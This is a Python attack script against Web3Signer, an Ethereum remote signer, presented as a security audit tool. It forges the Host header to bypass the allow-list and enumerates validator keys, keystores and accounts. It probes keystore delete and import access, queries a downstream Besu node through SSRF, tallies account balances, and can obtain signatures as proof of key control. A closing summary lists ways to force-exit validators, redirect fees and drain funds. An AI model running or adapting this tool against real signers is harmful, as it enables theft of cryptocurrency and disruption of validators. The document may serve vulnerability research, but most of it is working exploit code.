#!/usr/bin/env python3
"""
Web3Signer Full Enumeration — Auth Bypass + Complete Data Extraction
====================================================================
Bypasses HostAllowListHandler (Host header spoof) and enumerates EVERY
piece of information the signer exposes without authentication:

  - Server status, health, and component health checks
  - Prometheus metrics (version, key count, JVM, signing stats)
  - All loaded validator/account public keys
  - Key Manager API keystore metadata (IDs, derivation paths, read-only flags)
  - CommitBoost proxy key mappings
  - Slashing protection high watermark
  - Reload status and timing
  - Eth1 JSON-RPC methods (accounts, chain ID, block, peers, node info)
  - SSRF recon through PassThroughHandler (downstream Besu node data)
  - Signing proof (demonstrates unrestricted private key access)

Every endpoint returns data with ZERO authentication — only the Host header
check stands between the network and complete information disclosure.

Usage:
  python3 enumerate_signer.py --target <HOST>:<PORT>
  python3 enumerate_signer.py --target <HOST>:<PORT> --output results.txt
  python3 enumerate_signer.py --target <HOST>:<PORT> --metrics-port 9001 --sign-proof

IMPORTANT: Security audit tool. Only use against systems you are authorized to test.
"""

import argparse
import json
import sys
import time
import urllib.request
import urllib.error
from datetime import datetime, timezone
from typing import Optional


# ---------------------------------------------------------------------------
# HTTP helpers — every request spoofs Host: localhost to bypass Gap 1
# ---------------------------------------------------------------------------

def http_get(target: str, path: str, accept: str = "application/json",
             timeout: int = 8) -> tuple[int, str]:
    """GET with Host: localhost bypass."""
    url = f"http://{target}{path}"
    headers = {"Host": "localhost", "Accept": accept}
    r = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body
    except Exception as e:
        return 0, str(e)


def http_post(target: str, path: str, body: dict | str,
              timeout: int = 10) -> tuple[int, str]:
    """POST JSON with Host: localhost bypass."""
    url = f"http://{target}{path}"
    data = (json.dumps(body) if isinstance(body, dict) else body).encode("utf-8")
    headers = {
        "Host": "localhost",
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    r = urllib.request.Request(url, data=data, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body
    except Exception as e:
        return 0, str(e)


def http_delete(target: str, path: str, body: dict,
                timeout: int = 10) -> tuple[int, str]:
    """DELETE JSON with Host: localhost bypass."""
    url = f"http://{target}{path}"
    data = json.dumps(body).encode("utf-8")
    headers = {
        "Host": "localhost",
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    r = urllib.request.Request(url, data=data, headers=headers, method="DELETE")
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body
    except Exception as e:
        return 0, str(e)


def jsonrpc(target: str, method: str, params=None,
            rpc_id: int = 1) -> tuple[int, dict]:
    """JSON-RPC 2.0 call through root path."""
    body = {"jsonrpc": "2.0", "method": method, "params": params or [], "id": rpc_id}
    status, text = http_post(target, "/", body)
    try:
        return status, json.loads(text)
    except json.JSONDecodeError:
        return status, {"raw": text}


# ---------------------------------------------------------------------------
# Report builder — collects every finding into structured sections
# ---------------------------------------------------------------------------

class Report:
    def __init__(self, target: str):
        self.target = target
        self.timestamp = datetime.now(timezone.utc).isoformat()
        self.sections: list[tuple[str, str]] = []

    def add(self, title: str, content: str):
        self.sections.append((title, content))

    def add_json(self, title: str, status: int, body: str):
        """Add a section from an HTTP response."""
        try:
            parsed = json.loads(body)
            pretty = json.dumps(parsed, indent=2)
        except (json.JSONDecodeError, TypeError):
            pretty = body
        self.sections.append((title, f"HTTP {status}\n{pretty}"))

    def render(self) -> str:
        width = 78
        lines = []
        lines.append("=" * width)
        lines.append("WEB3SIGNER FULL ENUMERATION REPORT")
        lines.append(f"Target:    {self.target}")
        lines.append(f"Generated: {self.timestamp}")
        lines.append(f"Method:    Host header spoof (Host: localhost)")
        lines.append(f"Auth:      NONE — zero authentication on all endpoints")
        lines.append("=" * width)

        for title, content in self.sections:
            lines.append("")
            lines.append("-" * width)
            lines.append(f"  {title}")
            lines.append("-" * width)
            for line in content.split("\n"):
                lines.append(f"  {line}")

        lines.append("")
        lines.append("=" * width)
        lines.append("END OF REPORT")
        lines.append("=" * width)
        return "\n".join(lines)


# ---------------------------------------------------------------------------
# Enumeration modules
# ---------------------------------------------------------------------------

def enum_upcheck(target: str, report: Report):
    """GET /upcheck — liveness probe."""
    print("[1/14] Upcheck ...", end=" ", flush=True)
    status, body = http_get(target, "/upcheck", accept="text/plain")
    report.add("UPCHECK (/upcheck)", f"HTTP {status}\nResponse: {body.strip()}")
    print(f"{'OK' if status == 200 else f'FAIL ({status})'}")
    return status == 200


def enum_healthcheck(target: str, report: Report):
    """GET /healthcheck — detailed component health including DB and key loading."""
    print("[2/14] Health check ...", end=" ", flush=True)
    status, body = http_get(target, "/healthcheck")
    report.add_json("HEALTHCHECK (/healthcheck)", status, body)

    info = []
    if status == 200:
        try:
            data = json.loads(body)
            checks = data.get("checks", {})
            info.append(f"Overall status: {data.get('status', 'unknown')}")
            for check_name, check_data in checks.items():
                if isinstance(check_data, list):
                    for item in check_data:
                        s = item.get("status", "unknown")
                        info.append(f"  {check_name}: {s}")
                else:
                    info.append(f"  {check_name}: {check_data}")
        except (json.JSONDecodeError, AttributeError):
            pass
    print(f"{'OK' if status == 200 else f'status={status}'}")
    if info:
        report.add("HEALTHCHECK — Parsed Components", "\n".join(info))


def enum_metrics(host: str, metrics_port: int, report: Report):
    """GET /metrics on metrics port — Prometheus exposition."""
    print("[3/14] Prometheus metrics ...", end=" ", flush=True)
    target = f"{host}:{metrics_port}"
    status, body = http_get(target, "/metrics", accept="text/plain", timeout=5)

    if status == 200:
        # Parse key metrics
        interesting = {}
        for line in body.split("\n"):
            if line.startswith("#"):
                continue
            # Extract important metrics
            for keyword in [
                "signing_signers_loaded",
                "signing_bls_signing_duration",
                "signing_bls_missing_identifier",
                "signing_secp256k1_signing_duration",
                "signing_secp256k1_missing_identifier",
                "web3signer_release",
                "process_start_time_seconds",
                "process_cpu_seconds_total",
                "jvm_memory_bytes_used",
                "jvm_memory_bytes_max",
                "jvm_threads_current",
                "vertx_http_server_active_connections",
                "vertx_http_server_request",
            ]:
                if keyword in line:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        interesting[parts[0]] = parts[-1]

        summary = []
        for k, v in interesting.items():
            summary.append(f"{k} = {v}")

        report.add("PROMETHEUS METRICS — Key Values (port " + str(metrics_port) + ")",
                    "\n".join(summary) if summary else "(no matching metrics found)")
        report.add("PROMETHEUS METRICS — Full Dump (port " + str(metrics_port) + ")", body)
        print(f"OK ({len(interesting)} key metrics extracted)")
    else:
        report.add("PROMETHEUS METRICS (port " + str(metrics_port) + ")",
                    f"HTTP {status} — {body[:200]}")
        print(f"FAIL ({status})")


def enum_eth2_pubkeys(target: str, report: Report) -> list[str]:
    """GET /api/v1/eth2/publicKeys — all loaded BLS validator keys."""
    print("[4/14] Eth2 public keys ...", end=" ", flush=True)
    status, body = http_get(target, "/api/v1/eth2/publicKeys")
    keys = []
    if status == 200:
        try:
            keys = json.loads(body)
            if isinstance(keys, list):
                lines = [f"Total BLS public keys loaded: {len(keys)}", ""]
                for i, k in enumerate(keys):
                    lines.append(f"  [{i}] {k}")
                report.add("ETH2 PUBLIC KEYS (/api/v1/eth2/publicKeys)", "\n".join(lines))
                print(f"OK ({len(keys)} keys)")
            else:
                report.add_json("ETH2 PUBLIC KEYS", status, body)
                print("OK (unexpected format)")
        except json.JSONDecodeError:
            report.add("ETH2 PUBLIC KEYS", f"HTTP {status}\n{body}")
            print("OK (non-JSON)")
    else:
        report.add("ETH2 PUBLIC KEYS", f"HTTP {status} — endpoint not available (may be Eth1 mode)")
        print(f"N/A ({status})")
    return keys


def enum_eth1_pubkeys(target: str, report: Report) -> list[str]:
    """GET /api/v1/eth1/publicKeys — all loaded secp256k1 keys."""
    print("[5/14] Eth1 public keys ...", end=" ", flush=True)
    status, body = http_get(target, "/api/v1/eth1/publicKeys")
    keys = []
    if status == 200:
        try:
            keys = json.loads(body)
            if isinstance(keys, list):
                lines = [f"Total secp256k1 public keys loaded: {len(keys)}", ""]
                for i, k in enumerate(keys):
                    lines.append(f"  [{i}] {k}")
                report.add("ETH1 PUBLIC KEYS (/api/v1/eth1/publicKeys)", "\n".join(lines))
                print(f"OK ({len(keys)} keys)")
            else:
                report.add_json("ETH1 PUBLIC KEYS", status, body)
                print("OK (unexpected format)")
        except json.JSONDecodeError:
            report.add("ETH1 PUBLIC KEYS", f"HTTP {status}\n{body}")
            print("OK (non-JSON)")
    else:
        report.add("ETH1 PUBLIC KEYS", f"HTTP {status} — endpoint not available (may be Eth2 mode)")
        print(f"N/A ({status})")
    return keys


def enum_keymanager(target: str, report: Report) -> list[dict]:
    """GET /eth/v1/keystores — full keystore metadata (no auth despite OpenAPI bearerAuth)."""
    print("[6/14] Key Manager API ...", end=" ", flush=True)
    status, body = http_get(target, "/eth/v1/keystores")
    keystores = []
    if status == 200:
        try:
            data = json.loads(body)
            keystores = data.get("data", [])
            lines = [
                f"Total keystores: {len(keystores)}",
                f"NOTE: OpenAPI declares bearerAuth JWT — NOT IMPLEMENTED in code",
                "",
            ]
            for i, ks in enumerate(keystores):
                lines.append(f"  Keystore [{i}]:")
                lines.append(f"    validating_pubkey: {ks.get('validating_pubkey', 'N/A')}")
                lines.append(f"    derivation_path:   {ks.get('derivation_path', 'N/A')}")
                lines.append(f"    readonly:          {ks.get('readonly', 'N/A')}")
                lines.append("")
            report.add("KEY MANAGER API (/eth/v1/keystores) — NO AUTH", "\n".join(lines))
            print(f"OK ({len(keystores)} keystores)")
        except json.JSONDecodeError:
            report.add_json("KEY MANAGER API", status, body)
            print("OK (non-JSON)")
    else:
        report.add("KEY MANAGER API", f"HTTP {status} — {body[:200]}")
        print(f"{'N/A' if status == 404 else f'status={status}'}")

    # Probe DELETE and POST access (non-destructive: empty lists)
    del_status, del_body = http_delete(target, "/eth/v1/keystores", {"pubkeys": []})
    post_status, post_body = http_post(target, "/eth/v1/keystores",
                                       {"keystores": [], "passwords": []})
    access_lines = [
        f"DELETE /eth/v1/keystores (empty pubkeys): HTTP {del_status}",
        f"  Response: {del_body[:200]}",
        f"POST /eth/v1/keystores (empty import):    HTTP {post_status}",
        f"  Response: {post_body[:200]}",
        "",
        f"DELETE accessible: {'YES' if del_status in (200, 400) else 'NO'}",
        f"IMPORT accessible: {'YES' if post_status in (200, 400) else 'NO'}",
        "",
        "An attacker can:",
        "  - LIST all keystores with metadata",
        "  - DELETE keystores (disable validators -> inactivity penalties)",
        "  - IMPORT rogue keystores (inject attacker-controlled keys)",
    ]
    report.add("KEY MANAGER API — Write Access Probe", "\n".join(access_lines))
    return keystores


def enum_high_watermark(target: str, report: Report):
    """GET /api/v1/eth2/highWatermark — slashing protection watermark."""
    print("[7/14] High watermark ...", end=" ", flush=True)
    status, body = http_get(target, "/api/v1/eth2/highWatermark")
    if status == 200:
        report.add_json("HIGH WATERMARK (/api/v1/eth2/highWatermark)", status, body)
        try:
            data = json.loads(body)
            epoch = data.get("epoch", "N/A")
            slot = data.get("slot", "N/A")
            print(f"OK (epoch={epoch}, slot={slot})")
        except (json.JSONDecodeError, AttributeError):
            print("OK")
    else:
        report.add("HIGH WATERMARK", f"HTTP {status} — {body[:200]}")
        print(f"N/A ({status})")


def enum_reload(target: str, report: Report):
    """GET /reload — reload status and timing."""
    print("[8/14] Reload status ...", end=" ", flush=True)
    status, body = http_get(target, "/reload")
    report.add_json("RELOAD STATUS (/reload)", status, body)
    if status == 200:
        try:
            data = json.loads(body)
            print(f"OK (lastOp={data.get('lastOperationTime', 'N/A')})")
        except (json.JSONDecodeError, AttributeError):
            print("OK")
    else:
        print(f"status={status}")


def enum_commitboost(target: str, report: Report):
    """GET /signer/v1/get_pubkeys — CommitBoost proxy key mappings."""
    print("[9/14] CommitBoost keys ...", end=" ", flush=True)
    status, body = http_get(target, "/signer/v1/get_pubkeys")
    if status == 200:
        report.add_json("COMMITBOOST KEYS (/signer/v1/get_pubkeys)", status, body)
        print("OK")
    else:
        report.add("COMMITBOOST KEYS",
                    f"HTTP {status} — not available (CommitBoost API may be disabled)")
        print(f"N/A ({status})")


def enum_eth1_accounts(target: str, report: Report) -> list[str]:
    """eth_accounts JSON-RPC — all Eth1 addresses."""
    print("[10/14] eth_accounts (JSON-RPC) ...", end=" ", flush=True)
    status, resp = jsonrpc(target, "eth_accounts")
    accounts = resp.get("result", [])
    if isinstance(accounts, list) and accounts:
        lines = [f"Total Eth1 accounts: {len(accounts)}", ""]
        for i, addr in enumerate(accounts):
            lines.append(f"  [{i}] {addr}")
        report.add("ETH1 ACCOUNTS (eth_accounts JSON-RPC)", "\n".join(lines))
        print(f"OK ({len(accounts)} accounts)")
    elif status == 200:
        report.add("ETH1 ACCOUNTS", f"Response: {json.dumps(resp, indent=2)}")
        print("OK (empty or N/A)")
    else:
        report.add("ETH1 ACCOUNTS", f"HTTP {status} — {json.dumps(resp)[:200]}")
        print(f"N/A ({status})")
    return accounts if isinstance(accounts, list) else []


def enum_downstream_besu(target: str, report: Report):
    """Probe downstream Besu node through SSRF (PassThroughHandler)."""
    print("[11/14] Downstream Besu recon (SSRF) ...", end=" ", flush=True)

    methods = [
        ("net_version", [], "Network ID"),
        ("eth_chainId", [], "Chain ID"),
        ("eth_blockNumber", [], "Current block number"),
        ("web3_clientVersion", [], "Besu client version"),
        ("eth_syncing", [], "Sync status"),
        ("net_peerCount", [], "Connected peer count"),
        ("eth_gasPrice", [], "Current gas price"),
        ("eth_mining", [], "Mining status"),
        ("txpool_status", [], "Transaction pool status"),
        ("admin_nodeInfo", [], "Full node info (enode URL, ports, protocols)"),
        ("admin_peers", [], "Connected peer details (IPs, enodes)"),
        ("eth_coinbase", [], "Coinbase address"),
        ("eth_hashrate", [], "Hash rate"),
        ("debug_metrics", [], "Debug metrics"),
        ("eth_protocolVersion", [], "Protocol version"),
    ]

    accessible = []
    denied = []
    for method, params, description in methods:
        status, resp = jsonrpc(target, method, params)
        result = resp.get("result")
        error = resp.get("error")
        if status == 200 and result is not None:
            accessible.append((method, description, result))
        else:
            err_msg = ""
            if isinstance(error, dict):
                err_msg = error.get("message", str(error))
            elif error:
                err_msg = str(error)
            denied.append((method, description, err_msg or f"HTTP {status}"))

    lines = [
        "PassThroughHandler.java:56-62 forwards ALL unregistered JSON-RPC methods",
        "to the downstream Besu node — functions as an open SSRF proxy.",
        "",
        f"Accessible methods: {len(accessible)}/{len(methods)}",
        "",
    ]

    if accessible:
        lines.append("ACCESSIBLE (data returned):")
        for method, desc, result in accessible:
            result_str = json.dumps(result, indent=2) if isinstance(result, (dict, list)) else str(result)
            # Truncate very long results
            if len(result_str) > 500:
                result_str = result_str[:500] + "\n  ... (truncated)"
            lines.append(f"  {method} — {desc}:")
            for rline in result_str.split("\n"):
                lines.append(f"    {rline}")
            lines.append("")

    if denied:
        lines.append("DENIED/UNAVAILABLE:")
        for method, desc, err in denied:
            lines.append(f"  {method} — {desc}: {err[:100]}")

    report.add("DOWNSTREAM BESU NODE — SSRF via PassThroughHandler", "\n".join(lines))
    print(f"OK ({len(accessible)} accessible, {len(denied)} denied)")

    return accessible


def enum_eth1_balances(target: str, accounts: list[str], report: Report):
    """Query balance of each Eth1 account via SSRF to downstream Besu."""
    if not accounts:
        return
    print("[12/14] Account balances (via SSRF) ...", end=" ", flush=True)
    lines = ["Account balances queried via eth_getBalance through PassThroughHandler:", ""]
    total_wei = 0
    for addr in accounts:
        status, resp = jsonrpc(target, "eth_getBalance", [addr, "latest"])
        result = resp.get("result")
        if result:
            try:
                wei = int(result, 16)
                eth = wei / 1e18
                total_wei += wei
                lines.append(f"  {addr}: {eth:.6f} ETH ({wei} wei)")
            except (ValueError, TypeError):
                lines.append(f"  {addr}: {result}")
        else:
            lines.append(f"  {addr}: query failed ({resp})")

    total_eth = total_wei / 1e18
    lines.append("")
    lines.append(f"TOTAL BALANCE EXPOSED: {total_eth:.6f} ETH ({total_wei} wei)")
    lines.append(f"All of this is drainable via eth_sendTransaction (signs + broadcasts)")
    report.add("ETH1 ACCOUNT BALANCES — Assets At Risk", "\n".join(lines))
    print(f"OK (total: {total_eth:.6f} ETH)")


def enum_sign_proof(target: str, eth2_keys: list[str], eth1_accounts: list[str],
                    report: Report):
    """Prove unrestricted signing access by requesting a signature."""
    print("[13/14] Signing proof ...", end=" ", flush=True)
    lines = [
        "Demonstrating that the attacker can sign arbitrary data with private keys.",
        "This proves complete compromise — signing = functionally owning the key.",
        "",
    ]

    signed = 0

    # Eth2: sign a harmless RANDAO_REVEAL (proves BLS signing access)
    if eth2_keys:
        pubkey = eth2_keys[0]
        body = {
            "type": "RANDAO_REVEAL",
            "fork_info": {
                "fork": {
                    "previous_version": "0x04000000",
                    "current_version": "0x04000000",
                    "epoch": "0"
                },
                "genesis_validators_root":
                    "0x0000000000000000000000000000000000000000000000000000000000000000"
            },
            "randao_reveal": {
                "epoch": "0"
            }
        }
        status, resp = http_post(target, f"/api/v1/eth2/sign/{pubkey}", body)
        if status == 200:
            try:
                sig = json.loads(resp).get("signature", resp)
            except (json.JSONDecodeError, AttributeError):
                sig = resp
            lines.append(f"BLS SIGNING PROOF (RANDAO_REVEAL):")
            lines.append(f"  Pubkey:    {pubkey}")
            lines.append(f"  Signature: {sig}")
            lines.append(f"  Status:    HTTP {status}")
            lines.append(f"  Endpoint:  POST /api/v1/eth2/sign/{{pubkey}}")
            lines.append(f"  Auth:      NONE")
            lines.append("")
            signed += 1
        else:
            lines.append(f"BLS signing attempt: HTTP {status} — {resp[:200]}")
            lines.append("")

    # Eth1: sign a test message with eth_sign (proves secp256k1 access)
    if eth1_accounts:
        addr = eth1_accounts[0]
        test_msg = "0x" + "41" * 32  # harmless test data
        status, resp = jsonrpc(target, "eth_sign", [addr, test_msg])
        result = resp.get("result")
        if result:
            lines.append(f"SECP256K1 SIGNING PROOF (eth_sign):")
            lines.append(f"  Address:   {addr}")
            lines.append(f"  Message:   {test_msg}")
            lines.append(f"  Signature: {result}")
            lines.append(f"  Method:    eth_sign JSON-RPC")
            lines.append(f"  Auth:      NONE")
            lines.append("")
            signed += 1
        else:
            lines.append(f"eth_sign attempt: {json.dumps(resp)[:200]}")
            lines.append("")

    if signed:
        lines.append(f"RESULT: {signed} signing proof(s) obtained WITHOUT ANY AUTHENTICATION")
        lines.append(f"The attacker has full, unrestricted signing access to all loaded keys.")
    else:
        lines.append("No keys available for signing proof (signer may have no keys loaded)")

    report.add("SIGNING PROOF — Private Key Access Demonstration", "\n".join(lines))
    print(f"OK ({signed} proof(s))" if signed else "N/A (no keys)")


def enum_attack_surface_summary(target: str, eth2_keys: list[str],
                                 eth1_accounts: list[str], keystores: list[dict],
                                 besu_methods: list, report: Report):
    """Generate the final attack surface summary."""
    print("[14/14] Attack surface summary ...", end=" ", flush=True)

    lines = [
        "TOTAL INFORMATION EXPOSED WITHOUT AUTHENTICATION:",
        "",
        f"  BLS validator public keys:     {len(eth2_keys)}",
        f"  Secp256k1 Eth1 accounts:       {len(eth1_accounts)}",
        f"  Keystore metadata entries:      {len(keystores)}",
        f"  Besu SSRF methods accessible:   {len(besu_methods)}",
        "",
        "ASSETS AT RISK:",
        "",
    ]

    if eth2_keys:
        staked_eth = len(eth2_keys) * 32
        lines.append(f"  Eth2 Validators: {len(eth2_keys)}")
        lines.append(f"  Staked ETH:      {staked_eth} ETH (at 32 ETH per validator)")
        lines.append(f"  Attack vectors:")
        lines.append(f"    - VOLUNTARY_EXIT: force-exit all validators (irreversible)")
        lines.append(f"    - VALIDATOR_REGISTRATION: redirect all MEV fees to attacker")
        lines.append(f"    - AGGREGATION_SLOT, SYNC_COMMITTEE_*: sign without slashing check")
        lines.append(f"    - DELETE keystores: cause inactivity penalties")
        lines.append(f"    - With DB access: corrupt slashing protection -> double-sign -> slashing")
        lines.append("")

    if eth1_accounts:
        lines.append(f"  Eth1 Accounts: {len(eth1_accounts)}")
        lines.append(f"  Attack vectors:")
        lines.append(f"    - eth_sendTransaction: sign AND broadcast (direct fund theft)")
        lines.append(f"    - eth_signTransaction: sign transactions for later broadcast")
        lines.append(f"    - eth_sign: sign arbitrary messages (phishing, social engineering)")
        lines.append(f"    - eth_signTypedData: sign EIP-712 typed data (permit, approvals)")
        lines.append(f"    - SSRF via PassThroughHandler: full access to downstream Besu")
        lines.append("")

    lines.append("AUTHENTICATION BYPASS METHOD:")
    lines.append(f"  Set HTTP header: Host: localhost")
    lines.append(f"  HostAllowListHandler.java reads Host header (client-controlled)")
    lines.append(f"  Zero additional auth on any endpoint after Host check passes")
    lines.append("")
    lines.append("VULNERABILITY ROOT CAUSES:")
    lines.append(f"  1. HostAllowListHandler checks Host header, not source IP")
    lines.append(f"  2. Zero authentication middleware (no JWT, no API key, nothing)")
    lines.append(f"  3. Docker image ships with 0.0.0.0 binding (network accessible)")
    lines.append(f"  4. Key Manager API declares bearerAuth in OpenAPI but doesn't enforce it")
    lines.append(f"  5. PassThroughHandler acts as open SSRF proxy to downstream node")

    report.add("ATTACK SURFACE SUMMARY", "\n".join(lines))
    print("OK")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Web3Signer Full Enumeration — Auth Bypass + Complete Data Extraction",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 enumerate_signer.py --target 10.0.0.5:9000
  python3 enumerate_signer.py --target 10.0.0.5:9000 --output report.txt
  python3 enumerate_signer.py --target 10.0.0.5:9000 --metrics-port 9001 --sign-proof
""")
    parser.add_argument("--target", required=True,
                        help="Web3Signer host:port (e.g. 10.0.0.5:9000)")
    parser.add_argument("--metrics-port", type=int, default=9001,
                        help="Prometheus metrics port (default: 9001)")
    parser.add_argument("--sign-proof", action="store_true",
                        help="Include signing proof (signs test data to prove key access)")
    parser.add_argument("--output", default="web3signer_enumeration.txt",
                        help="Output file path (default: web3signer_enumeration.txt)")

    args = parser.parse_args()
    target = args.target
    host = target.split(":")[0]

    print("=" * 70)
    print("Web3Signer Full Enumeration — Auth Bypass")
    print("=" * 70)
    print(f"Target:       {target}")
    print(f"Metrics port: {args.metrics_port}")
    print(f"Sign proof:   {'YES' if args.sign_proof else 'No'}")
    print(f"Output:       {args.output}")
    print(f"Bypass:       Host: localhost (HostAllowListHandler.java:50)")
    print("=" * 70)

    report = Report(target)

    # 1. Upcheck
    if not enum_upcheck(target, report):
        print("\n[!] Target not reachable via Host bypass. Aborting.")
        # Still save what we have
        with open(args.output, "w") as f:
            f.write(report.render())
        print(f"[*] Partial report saved to {args.output}")
        sys.exit(1)

    # 2. Health check
    enum_healthcheck(target, report)

    # 3. Metrics
    enum_metrics(host, args.metrics_port, report)

    # 4-5. Public keys (both modes)
    eth2_keys = enum_eth2_pubkeys(target, report)
    eth1_keys = enum_eth1_pubkeys(target, report)

    # 6. Key Manager API
    keystores = enum_keymanager(target, report)

    # 7. High watermark
    enum_high_watermark(target, report)

    # 8. Reload status
    enum_reload(target, report)

    # 9. CommitBoost
    enum_commitboost(target, report)

    # 10. Eth1 accounts (JSON-RPC)
    eth1_accounts = enum_eth1_accounts(target, report)

    # 11. Downstream Besu recon (SSRF)
    besu_methods = enum_downstream_besu(target, report)

    # 12. Account balances
    enum_eth1_balances(target, eth1_accounts, report)

    # 13. Signing proof (optional, default off for safety)
    if args.sign_proof:
        enum_sign_proof(target, eth2_keys, eth1_accounts, report)
    else:
        report.add("SIGNING PROOF", "Skipped (use --sign-proof to enable)")
        print("[13/14] Signing proof ... SKIPPED (use --sign-proof)")

    # 14. Attack surface summary
    enum_attack_surface_summary(target, eth2_keys, eth1_accounts, keystores,
                                 besu_methods, report)

    # Write report
    report_text = report.render()
    with open(args.output, "w") as f:
        f.write(report_text)

    print()
    print("=" * 70)
    print(f"REPORT SAVED: {args.output}")
    print(f"Total sections: {len(report.sections)}")
    print(f"Report size: {len(report_text)} bytes")
    print("=" * 70)

    # Also print to stdout
    print()
    print(report_text)


if __name__ == "__main__":
    main()
